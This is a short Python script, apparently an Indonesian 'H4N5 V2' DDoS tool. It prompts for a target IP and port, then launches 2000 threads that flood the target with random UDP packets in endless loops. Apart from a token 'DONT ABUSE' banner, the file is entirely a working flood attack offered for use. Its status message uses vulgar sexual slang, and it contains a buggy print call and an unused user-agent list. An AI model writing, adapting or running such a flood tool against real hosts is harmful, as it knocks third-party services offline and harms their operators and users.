import socket
import random
import threading
import time
import os , sys

print ("TOOLS H4N5 V2")
print ("TIDAK MENJAMIN TEMBUS DI SERVER BESAR/BER ANTI DDOS.")
print ("DONT ABUSE BROTHER!!")

ip = str(input(" Ip :"))
port = int(input(" Port :"))
choice = str(input(" Gas? y/n :"))
os.system("clear")

user_agent = []

user_agent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36")
user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
user_agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
user_agent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
user_agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
user_agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")

def udp():
	data = random._urandom(980)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(2000):
				s.sendto(data,addr)
			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
		except:
			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
			
for y in range(2000):
    if choice == 'y':
        th = threading.Thread(target = udp)
        th.start()